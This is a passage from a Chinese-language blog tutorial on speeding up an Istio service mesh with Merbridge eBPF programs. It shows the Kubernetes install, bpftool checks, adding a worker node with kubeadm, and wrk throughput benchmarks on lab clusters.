class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# bpftool prog show</span><br><span class="line">18: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">19: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">20: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">21: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">22: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">23: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br></pre></td></tr></table></figure><h5 id="merbridge安装"><a href="#merbridge安装" class="headerlink" title="merbridge安装"></a>merbridge安装</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl apply -f https://raw.githubusercontent.com/merbridge/merbridge/main/deploy/all-in-one.yaml</span><br><span class="line">clusterrole.rbac.authorization.k8s.io/merbridge created</span><br><span class="line">clusterrolebinding.rbac.authorization.k8s.io/merbridge created</span><br><span class="line">serviceaccount/merbridge created</span><br><span class="line">daemonset.apps/merbridge created</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pods -n istio-system</span><br><span class="line">NAME                                    READY   STATUS     RESTARTS   AGE</span><br><span class="line">istio-egressgateway-79bb75fcf9-7plxw    1/1     Running    0          17h</span><br><span class="line">istio-ingressgateway-84bfcfd895-ktbcg   1/1     Running    0          17h</span><br><span class="line">istiod-6c5cfd79db-4ww7r                 1/1     Running    0          17h</span><br><span class="line">merbridge-75rr6                         0/1     Init:0/1   0          2m57s</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pods -n istio-system</span><br><span class="line">NAME                                    READY   STATUS    RESTARTS   AGE</span><br><span class="line">istio-egressgateway-79bb75fcf9-7plxw    1/1     Running   0          19h</span><br><span class="line">istio-ingressgateway-84bfcfd895-ktbcg   1/1     Running   0          19h</span><br><span class="line">istiod-6c5cfd79db-4ww7r                 1/1     Running   0          19h</span><br><span class="line">merbridge-75rr6                        1/1     Running   0          12m</span><br></pre></td></tr></table></figure><p>再次查看系统中所有 cgroup 上的附加程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# bpftool cgroup tree</span><br><span class="line">CgroupPath</span><br><span class="line">ID       AttachType      AttachFlags     Name</span><br><span class="line">/sys/fs/cgroup/unified</span><br><span class="line">31       sock_ops                        mb_sockops</span><br><span class="line">43       bind4                           mb_bind</span><br><span class="line">27       connect4                        mb_sock4_connec</span><br><span class="line">35       getsockopt                      mb_get_sockopt</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-udevd.service</span><br><span class="line">    21       ingress</span><br><span class="line">    20       egress</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-journald.service</span><br><span class="line">    19       ingress</span><br><span class="line">    18       egress</span><br><span class="line">/sys/fs/cgroup/unified/system.slice/systemd-logind.service</span><br><span class="line">    23       ingress</span><br><span class="line">    22       egress</span><br></pre></td></tr></table></figure><p>再次查看系统中已经加载的所有 BPF 程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# bpftool prog show</span><br><span class="line">18: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">19: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">20: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">21: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">22: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">23: cgroup_skb  tag 6deef7357e7b4530  gpl</span><br><span class="line">        loaded_at 2022-02-17T08:35:47+0000  uid 0</span><br><span class="line">        xlated 64B  jited 66B  memlock 4096B</span><br><span class="line">27: cgroup_sock_addr  name mb_sock4_connec  tag 52444be6f9070ca0  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 2336B  jited 1329B  memlock 4096B  map_ids 1,2,3,7</span><br><span class="line">        btf_id 3</span><br><span class="line">31: sock_ops  name mb_sockops  tag 92e9974a3364b015  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 1272B  jited 704B  memlock 4096B  map_ids 1,3,8,9</span><br><span class="line">        btf_id 6</span><br><span class="line">35: cgroup_sockopt  name mb_get_sockopt  tag d2a89e73318e6dc2  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 864B  jited 509B  memlock 4096B  map_ids 8</span><br><span class="line">        btf_id 9</span><br><span class="line">39: sk_msg  name mb_msg_redir  tag 95e99118f09830d0  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 376B  jited 237B  memlock 4096B  map_ids 9</span><br><span class="line">        btf_id 12</span><br><span class="line">43: cgroup_sock_addr  name mb_bind  tag 57cd311f2e27366b  gpl</span><br><span class="line">        loaded_at 2022-02-17T09:32:53+0000  uid 0</span><br><span class="line">        xlated 16B  jited 40B  memlock 4096B</span><br><span class="line">        btf_id 15</span><br></pre></td></tr></table></figure><p>发现ebpf程序已经成功加载进内核</p><h5 id="确认ebpf程序生效"><a href="#确认ebpf程序生效" class="headerlink" title="确认ebpf程序生效"></a>确认ebpf程序生效</h5><p>yaml文件开启<code>debug</code>模式</p><p>打开日志追踪</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /sys/kernel/debug/tracing/tracing_on</span><br></pre></td></tr></table></figure><p>再次访问<code>192.168.19.84:31356/productpage</code></p><p>使用<code>cat /sys/kernel/debug/tracing/trace_pipe</code>查看输出</p><p><img src="/2022/02/28/从0到0-5-eBPF加速ServiceMesh实践/1.png" alt="1"></p><h5 id="tps测试如下"><a href="#tps测试如下" class="headerlink" title="tps测试如下"></a>tps测试如下</h5><p>其中85是没有部署merbridge的，即没有通过ebpf加速。84是经过ebpf加速的，可以看到经过ebpf加速之后tps增加了一倍。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/wrk-master# ./wrk -c1000 --latency http://192.168.19.85:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.85:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.19s   402.47ms   1.96s    77.78%</span><br><span class="line">    Req/Sec    14.47     12.03    50.00     78.95%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.21s</span><br><span class="line">     75%    1.34s</span><br><span class="line">     90%    1.77s</span><br><span class="line">     99%    1.96s</span><br><span class="line">  111 requests in 10.04s, 544.62KB read</span><br><span class="line"></span><br><span class="line">root@ubuntu:~/wrk-master# ./wrk -c1000 --latency http://192.168.19.84:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.84:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.52s   367.79ms   1.98s    80.85%</span><br><span class="line">    Req/Sec    17.94     18.18   140.00     89.08%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.61s</span><br><span class="line">     75%    1.72s</span><br><span class="line">     90%    1.85s</span><br><span class="line">     99%    1.98s</span><br><span class="line">  243 requests in 10.02s, 1.17MB read</span><br></pre></td></tr></table></figure><h4 id="集群测试"><a href="#集群测试" class="headerlink" title="集群测试"></a>集群测试</h4><p>集群测试分为两组</p><ul><li>没有经过merbridge加速：<code>192.168.19.85和192.168.19.83</code></li><li>经过merbridge加速：<code>192.168.19.84和192.168.19.82</code></li></ul><p>master节点分别是<code>192.168.19.85和192.168.19.84</code></p><h5 id="slave节点配置"><a href="#slave节点配置" class="headerlink" title="slave节点配置"></a>slave节点配置</h5><p>1.安装docker和k8s工具，这里不再赘述</p><p>2.将从节点加入主节点</p><p>主节点查看令牌，没有则需要创建令牌</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubeadm token list</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubeadm token create</span><br></pre></td></tr></table></figure><p>如果没有 <code>--discovery-token-ca-cert-hash</code> 的值，则可以通过在控制平面节点上执行以下命令来获取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># openssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2&gt;/dev/null | \</span></span><br><span class="line">   openssl dgst -sha256 -hex | sed <span class="string">'s/^.* //'</span></span><br></pre></td></tr></table></figure><p>3.从节点执行<code>kubeadm join</code>命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu1:/etc/kubernetes# swapoff -a</span><br><span class="line">root@ubuntu1:/etc/kubernetes# kubeadm join --token 11sf7j.b46h7ej8l01pddgj 192.168.19.85:6443 --discovery-token-ca-cert-hash sha256:dde9c1d26f1d6178203ed03e6e3e0df6c0d926aa60fba0f0a4e2a88b47b95a69</span><br><span class="line">[preflight] Running pre-flight checks</span><br><span class="line">[preflight] Reading configuration from the cluster...</span><br><span class="line">[preflight] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'</span><br><span class="line">W0222 09:41:45.561758    4675 utils.go:69] The recommended value for "resolvConf" in "KubeletConfiguration" is: /run/systemd/resolve/resolv.conf; the provided value is: /run/systemd/resolve/resolv.conf</span><br><span class="line">[kubelet-start] Writing kubelet configuration to file "/var/lib/kubelet/config.yaml"</span><br><span class="line">[kubelet-start] Writing kubelet environment file with flags to file "/var/lib/kubelet/kubeadm-flags.env"</span><br><span class="line">[kubelet-start] Starting the kubelet</span><br><span class="line">[kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap...</span><br><span class="line"></span><br><span class="line">This node has joined the cluster:</span><br><span class="line">* Certificate signing request was sent to apiserver and a response was received.</span><br><span class="line">* The Kubelet was informed of the new secure connection details.</span><br><span class="line"></span><br><span class="line">Run 'kubectl get nodes' on the control-plane to see this node join the cluster.</span><br></pre></td></tr></table></figure><p>4.主节点查看nodes情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/etc/kubernetes# kubectl get nodes</span><br><span class="line">NAME      STATUS   ROLES                  AGE     VERSION</span><br><span class="line">ubuntu    Ready    control-plane,master   12d     v1.23.3</span><br><span class="line">ubuntu1   Ready    &lt;none&gt;                 2m46s   v1.23.4</span><br></pre></td></tr></table></figure><p>5.查看pod的分布情况</p><p>192.168.19.85</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pod --all-namespaces -o wide</span><br><span class="line">NAMESPACE      NAME                                    READY   STATUS    RESTARTS       AGE   IP              NODE      NOMINATED NODE   READINESS GATES</span><br><span class="line">default        details-v1-5498c86cf5-bhv2h             2/2     Running   26 (40h ago)   12d   10.244.0.175    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        helloworld-v1-fdb8c8c58-gh4sf           2/2     Running   0              39h   10.244.1.4      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        helloworld-v2-5b46bc9f84-glxpg          2/2     Running   0              39h   10.244.1.3      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        productpage-v1-65b75f6885-p6k2w         2/2     Running   26 (40h ago)   12d   10.244.0.171    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        ratings-v1-b477cf6cf-k84kr              2/2     Running   26 (40h ago)   12d   10.244.0.179    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v1-79d546878f-q6f62             2/2     Running   26 (40h ago)   12d   10.244.0.168    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v2-548c57f459-cqq2r             2/2     Running   26 (40h ago)   12d   10.244.0.180    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v3-6dd79655b9-gr42h             2/2     Running   26 (40h ago)   12d   10.244.0.173    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        sleep-698cfc4445-k8ncb                  2/2     Running   0              39h   10.244.1.2      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istio-egressgateway-79bb75fcf9-z6pqt    1/1     Running   13 (40h ago)   12d   10.244.0.178    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istio-ingressgateway-84bfcfd895-cdkwd   1/1     Running   13 (40h ago)   12d   10.244.0.176    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istiod-6c5cfd79db-8nqqb                 1/1     Running   14 (40h ago)   12d   10.244.0.174    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    coredns-6d8c4cb4d-8xrmh                 1/1     Running   15 (40h ago)   13d   10.244.0.169    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    coredns-6d8c4cb4d-cv77n                 1/1     Running   14 (40h ago)   13d   10.244.0.181    ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    etcd-ubuntu                             1/1     Running   16 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-apiserver-ubuntu                   1/1     Running   14 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-controller-manager-ubuntu          1/1     Running   14 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-flannel-ds-87xdz                   1/1     Running   18 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-flannel-ds-drk55                   1/1     Running   0              40h   192.168.19.83   ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-proxy-9rwc5                        1/1     Running   0              40h   192.168.19.83   ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-proxy-qkcxz                        1/1     Running   14 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-scheduler-ubuntu                   1/1     Running   14 (40h ago)   13d   192.168.19.85   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br></pre></td></tr></table></figure><p>192.168.19.84</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# kubectl get pod --all-namespaces -o wide</span><br><span class="line">NAMESPACE      NAME                                    READY   STATUS    RESTARTS      AGE     IP              NODE      NOMINATED NODE   READINESS GATES</span><br><span class="line">default        details-v1-5498c86cf5-7qwql             2/2     Running   2 (23h ago)   6d16h   10.244.0.34     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        helloworld-v1-fdb8c8c58-28pm4           2/2     Running   0             22h     10.244.1.5      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        helloworld-v2-5b46bc9f84-rs5ch          2/2     Running   0             22h     10.244.1.6      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        productpage-v1-65b75f6885-kt88j         2/2     Running   2 (23h ago)   6d16h   10.244.0.31     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        ratings-v1-b477cf6cf-8bdk9              2/2     Running   2 (23h ago)   6d16h   10.244.0.35     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v1-79d546878f-nf4xd             2/2     Running   2 (23h ago)   6d16h   10.244.0.25     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v2-548c57f459-sdjzs             2/2     Running   2 (23h ago)   6d16h   10.244.0.24     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        reviews-v3-6dd79655b9-p6vdg             2/2     Running   2 (23h ago)   6d16h   10.244.0.26     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">default        sleep-698cfc4445-qncjl                  2/2     Running   0             22h     10.244.1.4      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istio-egressgateway-79bb75fcf9-7plxw    1/1     Running   1 (23h ago)   6d17h   10.244.0.29     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istio-ingressgateway-84bfcfd895-ktbcg   1/1     Running   1 (23h ago)   6d17h   10.244.0.32     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   istiod-6c5cfd79db-4ww7r                 1/1     Running   1 (23h ago)   6d17h   10.244.0.23     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   merbridge-9kmsk                         1/1     Running   1 (23h ago)   5d21h   10.244.0.28     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">istio-system   merbridge-jqt9x                         1/1     Running   7 (23h ago)   23h     10.244.1.3      ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    coredns-6d8c4cb4d-87slm                 1/1     Running   1 (23h ago)   6d17h   10.244.0.36     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    coredns-6d8c4cb4d-ld7cp                 1/1     Running   1 (23h ago)   6d17h   10.244.0.33     ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    etcd-ubuntu                             1/1     Running   4 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-apiserver-ubuntu                   1/1     Running   4 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-controller-manager-ubuntu          1/1     Running   4 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-flannel-ds-7lvxj                   1/1     Running   1 (23h ago)   23h     192.168.19.82   ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-flannel-ds-fqtst                   1/1     Running   1 (23h ago)   6d16h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-proxy-9kwsc                        1/1     Running   1 (23h ago)   23h     192.168.19.82   ubuntu1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-proxy-p8nw9                        1/1     Running   1 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system    kube-scheduler-ubuntu                   1/1     Running   4 (23h ago)   6d17h   192.168.19.84   ubuntu    &lt;none&gt;           &lt;none&gt;</span><br></pre></td></tr></table></figure><h5 id="外部向pod发送请求"><a href="#外部向pod发送请求" class="headerlink" title="外部向pod发送请求"></a>外部向pod发送请求</h5><h6 id="集群内"><a href="#集群内" class="headerlink" title="集群内"></a>集群内</h6><p>在node为<code>192.168.19.85</code>的机器上向node为<code>192.168.19.83</code>机器上的pod发送请求(没有merbridge加速)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# wrk -c1000 --latency http://192.168.19.83:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.83:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.62s   294.11ms   1.97s    66.67%</span><br><span class="line">    Req/Sec     9.85      8.67    50.00     78.87%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.73s</span><br><span class="line">     75%    1.85s</span><br><span class="line">     90%    1.97s</span><br><span class="line">     99%    1.97s</span><br><span class="line">  108 requests in 10.07s, 530.88KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 99</span><br><span class="line">Requests/sec:     10.72</span><br><span class="line">Transfer/sec:     52.72KB</span><br></pre></td></tr></table></figure><p>在node为<code>192.168.19.84</code>的机器上向node为<code>192.168.19.82</code>机器上的pod发送请求(有merbridge加速)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# wrk -c1000 --latency http://192.168.19.82:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.82:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.65s   252.43ms   1.99s    53.33%</span><br><span class="line">    Req/Sec    20.50     14.91    70.00     67.33%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.71s</span><br><span class="line">     75%    1.92s</span><br><span class="line">     90%    1.97s</span><br><span class="line">     99%    1.99s</span><br><span class="line">  233 requests in 10.10s, 1.12MB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 218</span><br><span class="line">Requests/sec:     23.08</span><br><span class="line">Transfer/sec:    113.95KB</span><br></pre></td></tr></table></figure><h6 id="集群间"><a href="#集群间" class="headerlink" title="集群间"></a>集群间</h6><p>在node为<code>192.168.19.85</code>的机器上向node为<code>192.168.19.84</code>机器上的pod发送请求(其中84上部署了merbridge加速)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# wrk -c1000 --latency http://192.168.19.84:31356/productpage</span><br><span class="line">Running 10s test @ http://192.168.19.84:31356/productpage</span><br><span class="line">  2 threads and 1000 connections</span><br><span class="line">  Thread Stats   Avg      Stdev     Max   +/- Stdev</span><br><span class="line">    Latency     1.54s   365.46ms   1.96s    70.00%</span><br><span class="line">    Req/Sec    16.30     11.91    60.00     72.84%</span><br><span class="line">  Latency Distribution</span><br><span class="line">     50%    1.79s</span><br><span class="line">     75%    1.88s</span><br><span class="line">     90%    1.95s</span><br><span class="line">     99%    1.96s</span><br><span class="line">  157 requests in 10.10s, 770.66KB read</span><br><span class="line">  Socket errors: connect 0, read 0, write 0, timeout 137</span><br><span class="line">Requests/sec:     15.55</span><br><span class="line">Transfer/sec:     76.33KB</span><br></pre></td></tr></table></figure><p>在node为<code>192.168.19.84</code>的机器上向node为<code>192.168.19.85</code>机器上的pod发送请求(其中85没有部署merbridge加速)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 